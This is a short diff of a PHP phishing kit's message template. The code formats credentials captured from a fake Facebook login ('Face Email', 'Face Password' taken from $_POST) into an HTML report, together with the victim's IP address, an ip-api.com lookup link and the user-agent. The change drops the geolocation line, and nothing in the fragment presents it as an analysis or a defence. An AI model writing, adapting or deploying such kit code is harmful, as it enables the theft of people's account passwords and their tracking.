@@ -12,8 +12,6 @@ $Z118_MESSAGE .= "
    <font style='color: rgb(128, 129, 131);'>&#10112; Face Email   :</font>  <font style='color: rgb(235, 79, 60);'> ".$_POST['email']."</font></br>
    <font style='color: rgb(128, 129, 131);'>&#10112; Face Password :</font><font style='color: rgb(60, 118, 235);'> ".$_POST['pass']."</font></br>
    
-   <font style='color: rgb(128, 129, 131);'>&#10112; Country Name/CITY/STATE:</font>  <font style='color: rgb(65, 66, 68);'> ".$_SESSION['_LOOKUP_COUNTRY_']."/".$_SESSION['_LOOKUP_CITY_']."/".$_SESSION['_LOOKUP_STATE_']."</font>
-   </br>
    
    <font style='color: rgb(128, 129, 131);'>IP:</font><font style='color: rgb(60, 118, 235);'><a target='_blank' style='text-decoration:none;' href='http://ip-api.com/".$_SESSION['_ip_']."'>".$_SESSION['_ip_']."</a></font></br>
    <font style='color:#9c0000;'></font> [User-Agent] = <font style='color:#0070ba;'>".$_POST['b']."</font>
